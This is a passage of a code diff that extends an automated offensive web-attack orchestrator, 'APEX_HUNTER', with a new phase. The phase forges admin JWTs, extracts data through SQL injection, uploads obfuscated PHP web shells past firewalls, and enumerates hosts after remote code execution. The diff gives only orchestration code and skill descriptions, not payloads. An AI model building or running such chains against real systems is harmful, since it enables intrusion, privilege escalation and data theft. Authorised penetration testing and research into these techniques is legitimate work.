         13: "Phase 13 [RED+BLACK TEAM]: OGNL/EL-Inject + SpEL + Velocity/FreeMarker-SSTI + OAuth2-Device + AzureAD-Token + S3-Presign + Nginx-Misconfig + Traefik-Dashboard + ArgoCD + DOM-Clobber + mXSS + PaddingOracle + WeakPRNG + gRPC-Enum + Kerberos-Hints + Struts2-CVE + Log4Shell2 + MobileAPIKey + WS-SSRF + HelmSecrets + InternalGateway + CSRF-Adv + XXE-SVG/XLIFF + BFLA-Adv + DNS-Exfil + Serverless-FaaS (60 tools)",
         14: "Phase 14 [RED+BLACK TEAM]: HTTP-Smuggling-FE + CacheDeception-Adv + GatewayBypass + RaceCondition-Adv + GraphQL-Deep + OAuth2-TokenTheft + SubTakeover-Adv + XSS-AdvPayloads + JWT-SecretBrute + SSRF-AdvChain + LateralMove + Persistence + CloudStorage + CredStuffing + TLS-Attack + PwdPolicy + GQL-Schema + ZeroTrustBypass + APIVersionAbuse + BinaryAnalyzer (70 tools)",
         15: "Phase 15 [BLACK TEAM]: OAuth2-TokenHijack + HTTP-Desync-TE + JWT-SecretCrack + SubBrute + GQL-IDOR + CORS-Chain + OpenAPI-Fuzz + AzureBlob + SessionFix + CRLF-Adv + CryptoWeak + SensitiveDeep + RateLimit-Adv + APIKey-Exp + CloudPivot + FullReport + OAuth2-Re + Desync-Re + JWTCrack-Re + SubBrute-Re (20 tools)",
+        16: "Phase 16 [CHAIN+BYPASS]: AuthContextHarvest + ContextualMultiStage(JWT-forge+IDOR-auth+SQLi-extract) + WAFBypassUpload(10 variants) + PostRCE-ImpactMap(14 cmds) + DynamicWAFBypass(CMDi/XSS/SQLi adapters) (5 tools)",
     }
 
     def __init__(self, cfg: Config):
@@ -14465,6 +15190,12 @@ class APEXOrchestrator:
         self.t355 = CloudMetaPivotChain();          self.t356 = FullChainReportGen()
         self.t357 = OAuth2TokenHijack();            self.t358 = HTTPDesyncTeDetector()
         self.t359 = JWTSecretCracker();             self.t360 = ReconSubdomainBrute()
+        # Phase 16 — Contextual State + WAF Bypass + Post-Exploit (5 tools)
+        self.t361 = AuthContextHarvester()
+        self.t362 = ContextualMultiStageChain()
+        self.t363 = WAFBypassUploadChain()
+        self.t364 = PostRCEImpactMapper()
+        self.t365 = DynamicWAFBypassAdapter()
 
     def _init_profile(self, url: str) -> TargetProfile:
         p = urlparse(url)
@@ -14662,6 +15393,12 @@ class APEXOrchestrator:
                 p = self.t355.run(p, cfg); p = self.t356.run(p, cfg)
                 p = self.t357.run(p, cfg); p = self.t358.run(p, cfg)
                 p = self.t359.run(p, cfg); p = self.t360.run(p, cfg)
+            elif n == 16:
+                p = self.t361.run(p, cfg)  # harvest auth context first
+                p = self.t362.run(p, cfg)  # multi-stage chain (JWT forge, auth IDOR, SQLi extract)
+                p = self.t363.run(p, cfg)  # WAF-bypass shell upload (10 variants)
+                p = self.t364.run(p, cfg)  # post-RCE impact mapping (14 enum cmds)
+                p = self.t365.run(p, cfg)  # dynamic WAF bypass adapter (CMDi/XSS/SQLi)
         except KeyboardInterrupt:
             warn("Interrupted — saving partial results...")
         except Exception as e:
@@ -14672,7 +15409,7 @@ class APEXOrchestrator:
         SEP = "═" * 70
         print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
         print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
-        print(f"{C.WHITE}  360 Tools | 370 Skills | Auto-Chain Execution{C.NC}")
+        print(f"{C.WHITE}  365 Tools | 375 Skills | Auto-Chain Execution{C.NC}")
         print(f"{C.WHITE}{SEP}{C.NC}")
         print(f"  Targets : {', '.join(self.cfg.targets)}")
         print(f"  Output  : {self.cfg.output}")
@@ -14710,7 +15447,7 @@ class APEXOrchestrator:
 # SKILLS INDEX
 # ══════════════════════════════════════════════════════════════
 SKILLS_INDEX = """
-APEX_HUNTER v1.0 — Skills Index (370 Skills / 360 Tools)
+APEX_HUNTER v1.0 — Skills Index (375 Skills / 365 Tools)
 ═════════════════════════════════════════════════════════
 SKILL-01  DNS resolution & multi-record enumeration
 SKILL-02  TLS version, cipher, certificate, SAN extraction
@@ -15101,6 +15838,14 @@ SKILL-367 OAuth2 re-test chain — second-pass token hijack with expanded redire
 SKILL-368 HTTP desync re-probe — TE-OBF and H2-UPGRADE desync variants on alternate paths
 SKILL-369 JWT crack extended pass — key derivation from discovered domain names and common patterns
 SKILL-370 Subdomain pivot chain — brute-force discovered hosts re-fed into full Phase 1 recon
+
+PHASE 16 [CHAIN+BYPASS] — SKILLS 371-375
+────────────────────────────────────────────────────────────
+SKILL-371 Auth context harvest — register + login test account, capture JWT/session for auth chain
+SKILL-372 Contextual multi-stage chain — JWT crack→forge admin token→admin endpoints; auth IDOR enum; SQLi UNION extract
+SKILL-373 WAF-bypass shell upload — 10 obfuscated PHP variants: concat, base64-eval, chr(), null-byte, double-ext, MIME confusion
+SKILL-374 Post-RCE impact mapper — 14-command enum chain via confirmed RCE: uid/kernel/env/cron/SUID/root-dir
+SKILL-375 Dynamic WAF bypass adapter — re-test CMDi/XSS/SQLi findings with 15 obfuscation techniques; auto-selects working bypass
 """
 
 # ══════════════════════════════════════════════════════════════
@@ -15108,7 +15853,7 @@ SKILL-370 Subdomain pivot chain — brute-force discovered hosts re-fed into ful
 # ══════════════════════════════════════════════════════════════
 def main():
     p = argparse.ArgumentParser(
-        description="APEX_HUNTER v1.0 — 360 Tools | 370 Skills | Auto-Chain",
+        description="APEX_HUNTER v1.0 — 365 Tools | 375 Skills | Auto-Chain",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -15127,8 +15872,8 @@ Examples:
     p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
     p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
     p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
-    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
-                   help="Phases to run (default: 1-15, e.g. 1,2,7,8,9,10,11,12,13,14,15)")
+    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
+                   help="Phases to run (default: 1-16, e.g. 1,2,7,8,9,10,11,12,13,14,15,16)")
     p.add_argument("--ai-key",   default=os.environ.get("ANTHROPIC_API_KEY", ""),
                    dest="ai_key",
                    help="Anthropic API key for claude-opus-4-8 AI analysis (or set ANTHROPIC_API_KEY env var)")
